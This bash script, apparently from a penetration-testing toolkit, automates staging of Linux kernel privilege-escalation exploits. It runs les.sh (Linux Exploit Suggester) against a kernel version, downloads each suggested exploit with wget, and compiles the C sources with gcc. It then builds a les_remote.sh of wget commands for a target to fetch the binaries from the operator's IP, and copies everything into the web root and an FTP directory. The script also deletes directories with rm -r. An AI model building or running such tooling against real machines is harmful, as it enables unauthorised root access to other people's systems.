#!/bin/bash

usage()  {
    echo "$0 <OPTION> <TARGET>"
    exit 1
}

if [ "$#" -ne 2 ]; then
    usage
fi

EXPLOIT_SCRIPT="les.sh"
OUTPUT_DIR="linux_privi_init"
OPTION=$1
KERNEL_VERSION=$2
SITE_URL=/var/www/html/${OUTPUT_DIR}
FTP_ADDR=/ftphome/${OUTPUT_DIR}
rm -r ${OUTPUT_DIR} 2> /dev/null
rm -r les_scriptnames.txt 2> /dev/null
rm  les_remote.sh 2> /dev/null
rm -r ${SITE_URL}
rm -r ${FTP_ADDR}

mkdir  ${OUTPUT_DIR}
#
echo $OPTION
echo $KERNEL_VERSION
${EXPLOIT_SCRIPT} ${OPTION} "${KERNEL_VERSION}" > targets.txt
cat targets.txt | grep [+]  | cut -f2 -d" " > les_cves.txt
cat targets.txt | grep [+]  | cut -f3 -d" " > les_names.txt
cat targets.txt | grep Download | cut -f6 -d" "  > les_urls.txt
for url in $(cat les_urls.txt); do
    nameExploit=$(echo $url | awk -F "/" '{print $NF}')
    echo $nameExploit >> les_scriptnames.txt
done

paste -d";" les_cves.txt les_names.txt les_urls.txt les_scriptnames.txt > les.txt
rm les_cves.txt
rm les_names.txt
rm les_urls.txt


cd ${OUTPUT_DIR}
for url in $(cat ../les.txt); do
    nameExploit=$(echo $url | cut -f3 -d";")
    urlExploit=$(echo $url | cut -f4 -d";")
    wget $urlExploit
done
#
for i in $(ls -1); do
     # If contains #include is a cfile
     if [[ $(cat $i | grep \#include) ]]; then
        if [[ $(echo $i | awk -F "." '{print $NF}') != "c" ]]; then
            mv $i ${i}.c
            gcc -Wl,--hash-style=both ${i}.c -o ${i}
        else
            gcc -Wl,--hash-style=both ${i} -o ${i::-2}
        fi
     fi
done
for i in $(ls -1); do
    echo "wget http://$CURRENT_IP/linux_privi_init/${i}" >> ../les_remote.sh
done

mkdir -p ${SITE_URL}
mkdir -p ${FTP_ADDR}
cd ..
cp les_remote.sh ${SITE_URL}
cp ${OUTPUT_DIR}/* ${SITE_URL}
cp les_remote.sh ${FTP_ADDR}
cp ${OUTPUT_DIR}/* ${FTP_ADDR}
